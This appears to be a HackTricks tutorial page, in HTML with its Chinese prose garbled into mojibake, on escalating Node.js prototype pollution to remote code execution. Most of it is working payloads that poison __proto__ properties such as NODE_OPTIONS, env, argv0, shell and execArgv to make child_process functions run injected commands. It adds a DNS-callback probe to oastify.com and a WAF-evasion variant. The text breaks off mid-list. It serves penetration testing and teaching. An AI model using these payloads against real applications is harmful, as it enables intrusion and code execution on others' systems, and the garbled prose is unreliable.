<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Prototype Pollution to RCE</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="prototype-pollution-to-rce"><a class="header" href="#prototype-pollution-to-rce">Prototype Pollution to RCE</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="æ¼æ´ä»£ç "><a class="header" href="#æ¼æ´ä»£ç ">æ¼æ´ä»£ç </a></h2>
<p>æƒ³è±¡ä¸€ä¸‹ä¸€ä¸ªçœŸå®çš„ JS ä½¿ç”¨å¦‚ä¸‹ä»£ç ï¼š</p>
<pre><code class="language-javascript">const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) &amp;&amp; isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 &gt; a_file.js`
var proc = fork('a_file.js');
</code></pre>
<h2 id="pp2rce-é€šè¿‡ç¯å¢ƒå˜é‡"><a class="header" href="#pp2rce-é€šè¿‡ç¯å¢ƒå˜é‡">PP2RCE é€šè¿‡ç¯å¢ƒå˜é‡</a></h2>
<p><strong>PP2RCE</strong> æ„å‘³ç€ <strong>åŸå‹æ±¡æŸ“åˆ° RCE</strong>ï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ã€‚</p>
<p>æ ¹æ®è¿™ä¸ª <a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/"><strong>å†™ä½œ</strong></a>ï¼Œå½“ä¸€ä¸ª <strong>è¿›ç¨‹è¢«ç”Ÿæˆ</strong> æ—¶ï¼Œä½¿ç”¨ <strong><code>child_process</code></strong> ä¸­çš„æŸäº›æ–¹æ³•ï¼ˆå¦‚ <code>fork</code> æˆ– <code>spawn</code> æˆ–å…¶ä»–ï¼‰ä¼šè°ƒç”¨æ–¹æ³• <code>normalizeSpawnArguments</code>ï¼Œè¿™æ˜¯ä¸€ä¸ª <strong>åŸå‹æ±¡æŸ“å·¥å…·ï¼Œç”¨äºåˆ›å»ºæ–°çš„ç¯å¢ƒå˜é‡</strong>ï¼š</p>
<pre><code class="language-javascript">//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // &lt;-- Pollution
}
}
</code></pre>
<p>æ£€æŸ¥ä»£ç ï¼Œä½ å¯ä»¥çœ‹åˆ°é€šè¿‡<strong>æ±¡æŸ“</strong>å±æ€§**<code>.env</code><strong>å¯ä»¥</strong>æ¯’å®³ <code>envPairs</code>**ã€‚</p>
<h3 id="æ¯’å®³-__proto__"><a class="header" href="#æ¯’å®³-__proto__"><strong>æ¯’å®³ <code>__proto__</code></strong></a></h3>
<p>{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œç”±äºnodeçš„**<code>child_process</code><strong>åº“ä¸­çš„</strong><code>normalizeSpawnArguments</code><strong>å‡½æ•°çš„å·¥ä½œæ–¹å¼ï¼Œå½“è°ƒç”¨æŸä¸ªå‡½æ•°ä»¥</strong>è®¾ç½®æ–°çš„ç¯å¢ƒå˜é‡<strong>æ—¶ï¼Œä½ åªéœ€è¦</strong>æ±¡æŸ“ä»»ä½•ä¸œè¥¿**ã€‚<br />
ä¾‹å¦‚ï¼Œå¦‚æœä½ æ‰§è¡Œ<code>__proto__.avar="valuevar"</code>ï¼Œè¿›ç¨‹å°†ä»¥ä¸€ä¸ªåä¸º<code>avar</code>ä¸”å€¼ä¸º<code>valuevar</code>çš„å˜é‡è¢«ç”Ÿæˆã€‚</p>
<p>ç„¶è€Œï¼Œä¸ºäº†ä½¿<strong>ç¯å¢ƒå˜é‡æˆä¸ºç¬¬ä¸€ä¸ª</strong>ï¼Œä½ éœ€è¦<strong>æ±¡æŸ“****<code>.env</code>å±æ€§</strong>ï¼Œå¹¶ä¸”ï¼ˆä»…åœ¨æŸäº›æ–¹æ³•ä¸­ï¼‰è¯¥å˜é‡å°†æ˜¯<strong>ç¬¬ä¸€ä¸ª</strong>ï¼ˆå…è®¸æ”»å‡»ï¼‰ã€‚</p>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨ä»¥ä¸‹æ”»å‡»ä¸­**<code>NODE_OPTIONS</code><strong>ä¸åœ¨</strong><code>.env</code>**å†…çš„åŸå› ã€‚
{% endhint %}</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
</code></pre>
<p>{% endcode %}</p>
<h3 id="æ±¡æŸ“-constructorprototype"><a class="header" href="#æ±¡æŸ“-constructorprototype">æ±¡æŸ“ <code>constructor.prototype</code></a></h3>
<pre><code class="language-javascript">const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
</code></pre>
<h2 id="pp2rce-via-env-vars--cmdline"><a class="header" href="#pp2rce-via-env-vars--cmdline">PP2RCE via env vars + cmdline</a></h2>
<p>ä¸ä¹‹å‰çš„æœ‰æ•ˆè½½è·ç±»ä¼¼ï¼Œæå‡ºäº†ä¸€ç§æœ‰ä¸€äº›å˜åŒ–çš„æœ‰æ•ˆè½½è·ï¼Œè¯¦è§<a href="https://blog.sonarsource.com/blitzjs-prototype-pollution/"><strong>è¿™ç¯‡æ–‡ç« </strong></a><strong>.</strong> ä¸»è¦åŒºåˆ«åœ¨äºï¼š</p>
<ul>
<li>å®ƒä¸æ˜¯å°†nodejs <strong>æœ‰æ•ˆè½½è·</strong> å­˜å‚¨åœ¨æ–‡ä»¶ <code>/proc/self/environ</code> ä¸­ï¼Œè€Œæ˜¯å­˜å‚¨åœ¨ <strong><code>/proc/self/cmdline</code></strong> çš„ <strong>argv0</strong> ä¸­ã€‚</li>
<li>ç„¶åï¼Œå®ƒä¸æ˜¯é€šè¿‡ <strong><code>NODE_OPTIONS</code></strong> è¦æ±‚æ–‡ä»¶ <code>/proc/self/environ</code>ï¼Œè€Œæ˜¯ <strong>è¦æ±‚ <code>/proc/self/cmdline</code></strong>ã€‚</li>
</ul>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
</code></pre>
<p>{% endcode %}</p>
<h2 id="dns-äº¤äº’"><a class="header" href="#dns-äº¤äº’">DNS äº¤äº’</a></h2>
<p>ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè½½è·ï¼Œå¯ä»¥æ»¥ç”¨æˆ‘ä»¬ä¹‹å‰è®¨è®ºè¿‡çš„ NODE_OPTIONS ç¯å¢ƒå˜é‡ï¼Œå¹¶é€šè¿‡ DNS äº¤äº’æ£€æµ‹å…¶æ˜¯å¦æœ‰æ•ˆï¼š</p>
<pre><code class="language-json">{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
</code></pre>
<p>æˆ–è€…ï¼Œä¸ºäº†é¿å… WAF è¯¢é—®åŸŸåï¼š</p>
<pre><code class="language-json">{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
</code></pre>
<h2 id="pp2rce-æ¼æ´-child_process-å‡½æ•°"><a class="header" href="#pp2rce-æ¼æ´-child_process-å‡½æ•°">PP2RCE æ¼æ´ child_process å‡½æ•°</a></h2>
<p>åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†åˆ†æ <strong><code>child_process</code> ä¸­çš„æ¯ä¸ªå‡½æ•°</strong> ä»¥æ‰§è¡Œä»£ç ï¼Œå¹¶æŸ¥çœ‹æˆ‘ä»¬æ˜¯å¦å¯ä»¥ä½¿ç”¨ä»»ä½•æŠ€æœ¯å¼ºåˆ¶è¯¥å‡½æ•°æ‰§è¡Œä»£ç ï¼š</p>
<details>
<summary><code>exec</code> åˆ©ç”¨</summary>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
</code></pre>
<p>{% endcode %}</p>
</details>
<details>
<summary><strong><code>execFile</code> åˆ©ç”¨</strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var
<p>// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.<strong>proto</strong>.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.<strong>proto</strong>.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.<strong>proto</strong>.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');</p>
<p>// stdin trick - not working
// Not using stdin</p>
<p>// Windows - not working</p>
<pre><code>ä¸ºäº†ä½¿ **`execFile`** å·¥ä½œï¼Œå®ƒ **å¿…é¡»æ‰§è¡Œ node** ä»¥ä½¿ NODE\_OPTIONS ç”Ÿæ•ˆã€‚\
å¦‚æœå®ƒ **ä¸** åœ¨æ‰§è¡Œ **node**ï¼Œä½ éœ€è¦æ‰¾åˆ°å¦‚ä½•é€šè¿‡ **ç¯å¢ƒå˜é‡** æ¥ **æ”¹å˜æ‰§è¡Œ** çš„å†…å®¹å¹¶è®¾ç½®å®ƒä»¬ã€‚

**å…¶ä»–** æŠ€æœ¯åœ¨æ²¡æœ‰æ­¤è¦æ±‚çš„æƒ…å†µä¸‹ **å·¥ä½œ**ï¼Œå› ä¸ºå¯ä»¥é€šè¿‡åŸå‹æ±¡æŸ“ **ä¿®æ”¹** **è¢«æ‰§è¡Œçš„å†…å®¹**ã€‚ ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿ä½ å¯ä»¥æ±¡æŸ“ `.shell`ï¼Œä½ ä¹Ÿä¸ä¼šæ±¡æŸ“æ­£åœ¨è¢«æ‰§è¡Œçš„å†…å®¹ï¼‰ã€‚

&lt;/details&gt;

&lt;details&gt;

&lt;summary&gt;&lt;code&gt;fork&lt;/code&gt; åˆ©ç”¨&lt;/summary&gt;

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
</code></pre>
<p>{% endcode %}</p>
</details>
<details>
<summary><strong><code>spawn</code> åˆ©ç”¨</strong></summary>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
</code></pre>
<p>{% endcode %}</p>
</details>
<details>
<summary><strong><code>execFileSync</code> åˆ©ç”¨</strong></summary>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
</code></pre>
<p>{% endcode %}</p>
</details>
<details>
<summary><strong><code>execSync</code> åˆ©ç”¨</strong></summary>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
</code></pre>
<p>{% endcode %}</p>
</details>
<details>
<summary><strong><code>spawnSync</code> åˆ©ç”¨</strong></summary>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
</code></pre>
<p>{% endcode %}</p>
</details>
<h2 id="å¼ºåˆ¶ç”Ÿæˆ"><a class="header" href="#å¼ºåˆ¶ç”Ÿæˆ">å¼ºåˆ¶ç”Ÿæˆ</a></h2>
<p>åœ¨ä¹‹å‰çš„ç¤ºä¾‹ä¸­ï¼Œæ‚¨çœ‹åˆ°å¦‚ä½•è§¦å‘å°å·¥å…·ï¼ŒåŠŸèƒ½éœ€è¦<strong>è°ƒç”¨ <code>spawn</code><strong>çš„åŠŸèƒ½</strong>å­˜åœ¨</strong>ï¼ˆæ‰€æœ‰ç”¨äºæ‰§è¡ŒæŸäº›å†…å®¹çš„**<code>child_process</code><strong>æ–¹æ³•éƒ½ä¼šè°ƒç”¨å®ƒï¼‰ã€‚åœ¨ä¹‹å‰çš„ç¤ºä¾‹ä¸­ï¼Œè¿™æ˜¯</strong>ä»£ç çš„ä¸€éƒ¨åˆ†**ï¼Œä½†å¦‚æœä»£ç <strong>æ²¡æœ‰</strong>è°ƒç”¨å®ƒå‘¢ï¼Ÿ</p>
<h3 id="æ§åˆ¶-require-æ–‡ä»¶è·¯å¾„"><a class="header" href="#æ§åˆ¶-require-æ–‡ä»¶è·¯å¾„">æ§åˆ¶ require æ–‡ä»¶è·¯å¾„</a></h3>
<p>åœ¨è¿™ä¸ª<a href="https://blog.sonarsource.com/blitzjs-prototype-pollution/"><strong>å…¶ä»–å†™ä½œ</strong></a>ä¸­ï¼Œç”¨æˆ·å¯ä»¥æ§åˆ¶å°†æ‰§è¡Œçš„**<code>require</code><strong>çš„æ–‡ä»¶è·¯å¾„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…åªéœ€</strong>åœ¨ç³»ç»Ÿä¸­æ‰¾åˆ°ä¸€ä¸ª <code>.js</code> æ–‡ä»¶**ï¼Œè¯¥æ–‡ä»¶åœ¨å¯¼å…¥æ—¶å°†<strong>æ‰§è¡Œä¸€ä¸ª spawn æ–¹æ³•ã€‚</strong><br />
ä¸€äº›å¸¸è§çš„åœ¨å¯¼å…¥æ—¶è°ƒç”¨ spawn å‡½æ•°çš„æ–‡ä»¶ç¤ºä¾‹åŒ…æ‹¬ï¼š</p>
<ul>
<li>/path/to/npm/scripts/changelog.js</li>
<li>/opt/yarn-v1.22.19/preinstall.js</li>
